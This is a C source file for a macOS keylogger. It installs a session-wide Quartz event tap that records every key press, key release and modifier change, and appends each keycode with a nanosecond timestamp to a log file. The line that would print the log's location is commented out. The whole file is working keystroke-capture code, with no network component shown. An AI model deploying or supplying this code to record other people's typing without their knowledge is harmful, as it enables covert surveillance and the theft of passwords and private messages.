#include "keylogger.h"

// clock code https://gist.github.com/jbenet/1087739
void current_utc_time(struct timespec *ts) {
#ifdef __MACH__ // OS X does not have clock_gettime, use clock_get_time
    clock_serv_t cclock;
    mach_timespec_t mts;
    host_get_clock_service(mach_host_self(), CALENDAR_CLOCK, &cclock);
    clock_get_time(cclock, &mts);
    mach_port_deallocate(mach_task_self(), cclock);
    ts->tv_sec = mts.tv_sec;
    ts->tv_nsec = mts.tv_nsec;
#else
    clock_gettime(CLOCK_REALTIME, ts);
#endif
}

int main(int argc, const char *argv[]) {
    
    // Create an event tap to retrieve keypresses.
    CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged) | CGEventMaskBit(kCGEventKeyUp));
    CFMachPortRef eventTap = CGEventTapCreate(
        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
    );

    // Exit the program if unable to create the event tap.
    if(!eventTap) {
        fprintf(stderr, "ERROR: Unable to create event tap.\n");
        exit(1);
    }

    // Create a run loop source and add enable the event tap.
    CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
    CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
    CGEventTapEnable(eventTap, true);


    // Get the current time and open the logfile.
    time_t result = time(NULL);
    logfile = fopen(logfileLocation, "a");
    
    if (!logfile) {
        fprintf(stderr, "ERROR: Unable to open log file. Ensure that you have the proper permissions.\n");
        exit(1);
    }

    // Output to logfile.
    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
    fflush(logfile);

    // Display the location of the logfile and start the loop.
    /* printf("Logging to: %s\n", logfileLocation); */
    /* fflush(stdout); */

    CFRunLoopRun();

    return 0;
}


/* 
relevant doc links: 
https://developer.apple.com/reference/coregraphics
https://developer.apple.com/reference/coregraphics/quartz_event_services
https://developer.apple.com/reference/coregraphics/cgevent
integer value fields of CGEvent: https://developer.apple.com/reference/coregraphics/cgeventfield 
*/

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }

    // Retrieve the incoming keycode.
    CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

    // Get current timestamp:
    struct timespec ts;
    current_utc_time(&ts);

    if (type == kCGEventKeyUp) {
        fprintf(logfile, "%lu,%lu,%i,keyUP\n", ts.tv_sec, ts.tv_nsec, keyCode);
        fflush(logfile);
    }

    if (type == kCGEventKeyDown) {
        fprintf(logfile, "%lu,%lu,%i,keyDOWN\n", ts.tv_sec, ts.tv_nsec, keyCode);
        fflush(logfile);
    }

    if (type == kCGEventFlagsChanged) {
        fprintf(logfile, "%lu,%lu,%i,flagCHANGE\n", ts.tv_sec, ts.tv_nsec, keyCode);
        fflush(logfile);
    }

    return event;
}
